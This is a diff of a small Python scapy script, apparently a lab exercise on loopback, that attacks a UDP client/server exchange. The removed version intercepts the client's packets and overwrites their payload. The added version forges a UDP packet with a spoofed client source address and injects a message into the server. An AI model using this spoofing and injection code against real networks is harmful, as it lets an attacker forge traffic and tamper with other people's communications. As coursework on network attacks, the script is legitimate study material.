@@ -3,54 +3,21 @@ from scapy.all import *
 
 
 def hack_client(
-    client_ip: str, client_port: int, server_ip: str, server_port: int
+    message: str, client_ip: str, client_port: int, server_ip: str, server_port: int
 ) -> None:
     """
     Function that hacks the client by intercepting and modifying UDP packets
     """
 
-    def packet_handler(packet):
-        if IP in packet and UDP in packet:
-            # print("intercepted packet in ip and udp")
-            # print("PACKET INFO:")
-            # print(
-            #     f"{packet[IP].src}:{packet[UDP].sport} -> {packet[IP].dst}:{packet[UDP].dport}"
-            # )
-            # print("should match:")
-            # print(f"{client_ip}:{client_port} -> {server_ip}:{server_port}")
-
-            # print("packet details:")
-            # print(packet.show())
-            # print()
-            # print(packet.layers())
-            # print("\n\n")
-            if (
-                packet[IP].src == client_ip
-                and packet[IP].dst == server_ip
-                and packet[UDP].sport == client_port
-                and packet[UDP].dport == server_port
-            ):
-                print("packet is from client to server")
-                modified_packet = packet.copy()
-                if Raw in modified_packet:
-                    modified_packet[Raw].load = b"Hacked"
-                else:
-                    modified_packet = modified_packet / Raw(load=b"Hacked")
-
-                print(f"Packet intercepted: {packet[Raw].load}")
-                print(f"Packet modified: {modified_packet[Raw].load}")
-
-                del modified_packet[IP].chksum
-                del modified_packet[UDP].chksum
-
-                send(modified_packet, verbose=0)
-
-    sniff(
-        filter=f"udp",
-        prn=packet_handler,
-        # store=0,
-        iface="lo"
+    packet = (
+        IPv6(src=client_ip, dst=server_ip)
+        / UDP(sport=client_port, dport=server_port)
+        / Raw(load=f"{message}\n".encode())
     )
+    
+    print(f"Packet to send: {packet[Raw].load}")
+
+    send(packet, verbose=0, iface="lo")
 
 
 if __name__ == "__main__":
@@ -87,7 +54,7 @@ if __name__ == "__main__":
     args = parser.parse_args()
     print("Available interfaces:")
     interfaces = scapy.arch.get_if_list()
-    print(interfaces)
+    print(f"{interfaces}\n")
 
     print(f"Cliente a hackear: {args.client_ip}:{args.client_port}")
     print(f"Servidor: {args.server_ip}:{args.server_port}")
@@ -95,7 +62,7 @@ if __name__ == "__main__":
     conf.L3socket = L3RawSocket
 
     hack_client(
-        # packet="Hackeado",
+        message="Hola, soy un paquete UDP inyectado",
         client_ip=args.client_ip,
         client_port=args.client_port,
         server_ip=args.server_ip,
